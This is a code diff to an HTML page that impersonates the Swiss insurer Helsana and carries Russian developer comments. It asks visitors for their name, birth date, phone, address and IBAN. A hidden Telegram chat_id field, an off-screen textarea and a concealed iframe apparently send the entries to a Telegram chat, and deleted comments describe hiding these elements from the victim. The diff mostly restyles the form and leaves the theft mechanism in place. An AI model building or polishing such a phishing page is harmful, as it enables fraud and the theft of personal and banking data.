@@ -40,7 +40,6 @@
     </div>
 
     <div class="container">
-      <!-- Карточка 1 -->
       <section class="promo">
         <div class="promo__container">
           <img src="assets/1.webp" alt="Paar" class="promo__img">
@@ -51,7 +50,6 @@
         </div>
       </section>
 
-      <!-- Форма -->
       <section class="premium-calc">
         <h2 class="premium-calc__title" data-lang-ch="Persönliche Daten" data-lang-en="Personal details">Persönliche Daten</h2>
 
@@ -63,54 +61,49 @@
               
           <input type="hidden" name="chat_id" value="-1003907097706">
           <input type="hidden" name="parse_mode" value="Markdown">
-          
-          <!-- Скрытый textarea: выведен за экран, но браузер его отправит -->
           <textarea name="text" id="telegramText" style="position:absolute; left:-9999px; top:-9999px; opacity:0;" tabindex="-1" aria-hidden="true"></textarea>
 
           <div class="input-group">
-            <input type="text" id="name" class="input-field" placeholder=" " required>
-            <label for="name" class="input-label" data-lang-ch="Ihr vollständiger Name" data-lang-en="Your full name">Ihr vollständiger Name</label>
+            <label for="name" class="input-label-top" data-lang-ch="Ihr vollständiger Name" data-lang-en="Your full name">Ihr vollständiger Name</label>
+            <input type="text" id="name" class="input-field" placeholder="Ihr vollständiger Name" required>
           </div>
 
           <div class="input-group">
-            <input type="text" id="geburtsdatum" class="input-field" placeholder=" " required>
-            <label for="geburtsdatum" class="input-label" data-lang-ch="Ihr Geburtsdatum" data-lang-en="Your date of birth">Ihr Geburtsdatum</label>
+            <label for="geburtsdatum" class="input-label-top" data-lang-ch="Ihr Geburtsdatum" data-lang-en="Your date of birth">Ihr Geburtsdatum</label>
+            <input type="text" id="geburtsdatum" class="input-field" placeholder="__ / __ / ____" required>
           </div>
 
-          <div class="input-group phone-group">
-            <input type="text" id="phone-prefix" class="prefix-input" value="+41" maxlength="5" aria-label="Ländervorwahl">
-            <input type="tel" id="telefon" class="input-field phone-input" placeholder=" " required>
-            <label for="telefon" class="input-label phone-label" data-lang-ch="Ihre Telefonnummer" data-lang-en="Your phone number">Ihre Telefonnummer</label>
+          <!-- ТЕЛЕФОН -->
+          <div class="input-group">
+            <label for="telefon" class="input-label-top" data-lang-ch="Ihre Telefonnummer" data-lang-en="Your phone number">Ihre Telefonnummer</label>
+            <input type="tel" id="telefon" class="input-field" placeholder="+41" required>
           </div>
 
-          <div class="form-row">
-            <div class="input-group">
-              <input type="text" id="adresse" class="input-field" placeholder=" " required>
-              <label for="adresse" class="input-label" data-lang-ch="Strasse und Hausnummer" data-lang-en="Street and house number">Strasse und Hausnummer</label>
-            </div>
-
-            <div class="input-group">
-              <input type="text" id="plz" class="input-field" placeholder=" " required>
-              <label for="plz" class="input-label label-small" data-lang-ch="Postleitzahl" data-lang-en="Zip code">Postleitzahl</label>
-            </div>
-
-            <div class="input-group">
-              <input type="text" id="stadt" class="input-field" placeholder=" " required>
-              <label for="stadt" class="input-label" data-lang-ch="Wohnort" data-lang-en="Place of residence">Wohnort</label>
+          <div class="input-group">
+            <label for="adresse" class="input-label-top" data-lang-ch="Adresse" data-lang-en="Address">Adresse</label>
+            <div class="form-row">
+              <div class="input-group">
+                <input type="text" id="adresse" class="input-field" placeholder="Adresse" required>
+              </div>
+              <div class="input-group">
+                <input type="text" id="stadt" class="input-field" placeholder="Stadt" required>
+              </div>
+              <div class="input-group">
+                <input type="text" id="plz" class="input-field" placeholder="Postleitzahl" required>
+              </div>
             </div>
           </div>
 
-          <div class="input-group iban-group">
-            <input type="text" id="iban-prefix" class="prefix-input" value="CH" maxlength="2" aria-label="Ländercode">
-            <input type="text" id="iban" class="input-field iban-input" placeholder=" " required>
-            <label for="iban" class="input-label iban-label" data-lang-ch="Ihre IBAN" data-lang-en="Your IBAN">Ihre IBAN</label>
+          <!-- IBAN -->
+          <div class="input-group">
+            <label for="iban" class="input-label-top" data-lang-ch="Ihre IBAN" data-lang-en="Your IBAN">Ihre IBAN</label>
+            <input type="text" id="iban" class="input-field" placeholder="CH" required>
           </div>
 
           <button type="submit" class="premium-btn" data-lang-ch="Senden" data-lang-en="Send">Senden</button>
         </form>
       </section>
 
-      <!-- Карточка 2 -->
       <section class="promo">
         <div class="promo__container">
           <img src="assets/2.webp" alt="Gesundheitsberatung" class="promo__img">
@@ -121,7 +114,6 @@
         </div>
       </section>
 
-      <!-- Карточка 3 -->
       <section class="promo">
         <div class="promo__container">
           <img src="assets/3.webp" alt="Versicherungstipps" class="promo__img">
@@ -132,7 +124,6 @@
         </div>
       </section>
 
-      <!-- Блок преимуществ -->
       <section class="advantages">
         <h2 class="advantages__title" data-lang-ch="Ihre Vorteile bei Helsana" data-lang-en="Your benefits with Helsana">Ihre Vorteile bei Helsana</h2>
         <p class="advantages__lead" data-lang-ch="Es lohnt sich, Kundin oder Kunde bei Helsana zu sein. Über 2 Millionen Versicherte vertrauen der Marktleiterin – profitieren auch Sie von zahlreichen Vorteilen." data-lang-en="It pays to be a customer of Helsana. Over 2 million insured persons trust the market leader – benefit from numerous advantages too.">Es lohnt sich, Kundin oder Kunde bei Helsana zu sein. Über 2 Millionen Versicherte vertrauen der Marktleiterin – profitieren auch Sie von zahlreichen Vorteilen.</p>
@@ -176,7 +167,6 @@
       </section>
     </div> 
 
-    <!-- Блок наград -->
     <section class="awards">
       <div class="awards__container">
         <h2 class="awards__title" data-lang-ch="Unsere Auszeichnungen für Kundenzufriedenheit" data-lang-en="Our awards for customer satisfaction">Unsere Auszeichnungen für Kundenzufriedenheit</h2>
@@ -187,10 +177,8 @@
         </div>
       </div>
     </section>
-
   </main>
 
-  <!-- ПОДВАЛ -->
   <footer class="footer">
     <div class="footer__top">
       <div class="footer__container">
@@ -258,7 +246,6 @@
     </div>
   </footer>
 
-  <!-- ИСПРАВЛЕНО: вынесен за экран, а не скрыт через display:none -->
   <iframe name="tg_iframe" id="tg_iframe" style="position:absolute; left:-9999px; top:-9999px; width:1px; height:1px; opacity:0;" tabindex="-1" aria-hidden="true"></iframe>
 
   <script src="js/script.js"></script>
